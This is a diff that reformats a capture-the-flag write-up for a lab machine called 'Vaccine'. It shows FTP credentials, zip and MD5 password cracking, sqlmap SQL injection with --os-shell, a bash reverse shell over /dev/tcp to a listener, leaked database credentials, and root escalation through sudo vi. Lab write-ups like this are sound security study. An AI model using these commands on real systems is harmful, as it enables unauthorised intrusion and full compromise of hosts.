@@ -1,7 +1,11 @@
+# Vaccine
+
+## ifconfig
+
+<pre>
 inet 10.10.14.69  netmask 255.255.254.0
 inet6 fe80::d484:44d2:fd97:c02c
-
-# Vaccine
+</pre>
 
 ## nmap
 
@@ -41,17 +45,25 @@ HOP RTT       ADDRESS
 ftp 10.10.10.46
 username: ftpuser
 password: mc@F1l3ZilL4
-
-get the backup.zip
 </pre>
+
+and then get the backup.zip
 
 ## Use zip hash to crack
 
+> zip2john [backup.zip](./ftp/backup.zip) > [backup.hash](./ftp/backup.hash)
+
+> john [backup.hash](./ftp/backup.hash) --show 
+
 <pre>
-zip2john backup.zip > backup.hash
-john backup.hash --show (741852963)
-unzip backup.zip in this password
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+1 password hash cracked, 0 left
 </pre>
+
+- unzip with password 741852963
+
+> unzip backup.zip 
+
 
 ## Try login on [index.php](./ftp/backup/index.php)
 
@@ -64,25 +76,50 @@ password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
 
 > sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=01aruoep6i9jf18e8ho8runboo" --os-shell
 
-**pwd**
-> /var/lib/postgresql/11/main
+### Check self name
 
-**change cmd**
-*source*
-> bash -c 'bash -i >& /dev/tcp/10.10.14.69/8001 0>&1'
-*destination*
-> nc -lvnp 8001
+> whoami
 
-**id**
-> uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+<pre>
+postgres
+</pre>
 
-- postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
-> username: postgres
-> password: P@s5w0rd!
-> port:     5432 (omit)
-> dbname:   carsdb
+### Check current path
 
-## Sudo lists all privilege command can do
+> pwd
+
+<pre>
+/var/lib/postgresql/11/main
+</pre>
+
+### Remote command to local
+
+*Source*
+
+> bash -c 'bash -i >& /dev/tcp/10.10.14.69/*port* 0>&1'
+
+*Destination*
+
+> nc -lvnp *port*
+
+### Get ID
+
+> id
+
+<pre>
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+</pre>
+
+### Find postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
+
+<pre>
+username: postgres
+password: P@s5w0rd!
+port:     5432 (omit)
+dbname:   carsdb
+</pre>
+
+## Sudo lists all privilege current user can do
 
 > sudo -l
 
@@ -95,13 +132,23 @@ User postgres may run the following commands on vaccine:
     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
 </pre>
 
-- postgres can use vi in /bin/vi
-> which vi
-> /usr/bin/vi
+- Postgres can use *vi* of */bin/vi* (need sudo)
 
-- use sudo vi to get root
+> which vi
+
+<pre>
+/usr/bin/vi
+</pre>
+
+- Use *sudo vi* to get root
+
 > sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+- Input commend in *sudo vi* to get root privilege
+
 > :!/bin/bash -P
+
+## Finally
 
 <pre>
 root.txt
